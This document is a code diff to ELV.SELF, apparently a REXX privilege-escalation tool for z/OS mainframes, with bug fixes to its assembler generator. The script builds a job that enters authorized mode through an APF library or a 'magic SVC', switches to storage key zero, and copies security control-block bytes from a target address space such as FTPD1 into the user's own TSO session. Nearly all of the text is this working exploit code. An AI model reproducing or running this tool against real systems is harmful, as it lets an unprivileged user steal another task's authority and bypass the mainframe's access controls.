@@ -13,7 +13,7 @@
 /*     Usage from TSO:                                                       */
 /*         ex 'ELV.SELF' 'LIST' (Lists all adress spaces)                    */
 /*         ex 'ELV.SELF' 'TAR=FTPD1 APF=USER.LINKLIB'                        */
-/*         ex 'ELV.SELF' 'TAR=FTPD1 DSN=PDS_DSN SVC=233 12=AUTH '            */
+/*         ex 'ELV.SELF' 'TAR=FTPD1 DSN=PDS_DSN SVC=233 12=C1C2C3C4 '        */
 /*         ex 'ELV.SELF' 'TAR=FTPD1 DSN=PDS_DSN SVC=233'                     */
 /*                                                                           */
 /*                                                                           */
@@ -300,16 +300,17 @@ launch_payload:
     svc_num = arg(5)
     svc_reg = arg(6)
     svc_reg_v = arg(7)
+    say dsn
     
     
     PROG = rand_char(6)    
-    if svc_num <> SVC_NUM then
+    if svc_num <> "SVC_NUM" then
         say "Compiling " PROG "in" dsn ", using SVC " svc_num
     else
         say "Compiling " PROG "in APF" dsn
     
     
-    QUEUE "//ASMCMP1  JOB (JOBNAME),'XSS',CLASS=A,"
+    QUEUE "//ELVSELF  JOB (JOBNAME),'XSS',CLASS=A,"
     QUEUE "//*            TYPRUN=SCAN,"
     QUEUE "//             MSGLEVEL=(1,1),MSGCLASS=K,NOTIFY=&SYSUID"
     QUEUE "//*"
@@ -338,13 +339,15 @@ launch_payload:
     QUEUE "        ESAR 2                      OBTAIN OUR ADDR SPACE ID"
     QUEUE "        ST 2,OURASN SAVE IT         SAVE OUR ADDR SPACE ID"
     QUEUE "*"
-    if svc_reg <> svc_reg then
+    if svc_reg <> "SVC_REG" then
       Do
-         QUEUE "        L "||svc_reg||",PARAM         SAVE OUR ADDR SPACE ID"
+         QUEUE "        ST "||svc_reg||",STOR         STORE PARAM TO REG "
+         QUEUE "        L "||svc_reg||",PARAM         LOAD PARAM TO REG "
       End
-    if svc_num <> svc_num then
+    if svc_num <> "SVC_NUM" then
       Do
-         QUEUE "        SVC "||svc_num||"         SAVE OUR ADDR SPACE ID"
+         QUEUE "        SVC "||svc_num||"         CALL MAGIC SVC        "
+         QUEUE "        L "||svc_reg||",STOR         RESTORE PARAM TO REG"
       End
     QUEUE "        MODESET KEY=ZERO,MODE=PROB  AUTH MODE"
     QUEUE "        BAL 14,@INXMEM"
@@ -377,9 +380,9 @@ launch_payload:
     QUEUE "        LA 2,52                     GET FIST 52 BYTES ONLY"
     QUEUE "        MVCS 0(2,10),0(8),1         INJECT THEM TO LOCAL TSO"
     QUEUE "        LA 2,44                       "
-    QUEUE "        MVCS 56(2,10),56(8),1       SKIP SOME PTRS AND GET 44B"
+    QUEUE "        MVCS 56(2,10),56(8),1       SKIP SOME PTRS AND GET 44 B"
     QUEUE "        LA 2,2"
-    QUEUE "        MVCS 132(2,10),132(8),1     SKIP SOME PTRS AND GET 2B"
+    QUEUE "        MVCS 132(2,10),132(8),1     SKIP SOME PTRS AND GET 2 B"
     QUEUE "        BAL 14,@OUTXMEM"
     QUEUE "*        "
     QUEUE "        MODESET KEY=NZERO,MODE=PROB LEAVE AUTHORIZED MODE"
@@ -424,9 +427,10 @@ launch_payload:
     QUEUE "RMTASID  DC H'"||rmt_asid||"'"
     QUEUE "TSOASID  DC H'"||local_asid||"'"
     QUEUE "XMSTOR  DS CL256"
-    if svc_reg_v <> svc_reg_v then
+    if svc_reg_v <> "SVC_REG_V" then
       Do
          QUEUE "PARAM  DC X'"||svc_reg_v||"'"
+         QUEUE "STOR  DS F"
       End
     QUEUE "*"
     QUEUE "*       END of Program"
